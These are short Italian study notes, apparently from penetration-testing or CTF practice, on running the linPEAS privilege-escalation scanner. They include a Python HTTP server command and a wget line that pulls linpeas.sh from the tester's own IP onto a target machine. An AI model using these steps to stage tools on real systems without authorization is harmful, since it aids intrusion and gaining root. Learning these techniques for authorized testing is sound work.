# Privileg Escalation Tools

## linPEAS

Tool che permette di trovare tutte le possibili vulnerabilità all'interno del sistema.

linPEAS si usa per trovare vulnerabilità in modo tale da riuscire a entrare nel sistema come utente root

Link per scaricare linPEAS.sh -> [Link](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

Esecuzione 

- `chmod +x linPEAS.sh`
- `./linPEAS.sh`

Per caricarlo sul target possiamo fare cosi

- Step 1 : Impostiamo un server locale con python -> `python3 -m http.server 8080`
- Step 2 : Sul target facciamo `wget http://<nostro_ip>:8080/linpeas.sh`

### Esempio di Esecuzione

Per vedere un esempio di esecuzione andare qui -> [Esempio](https://asciinema.org/a/309566)
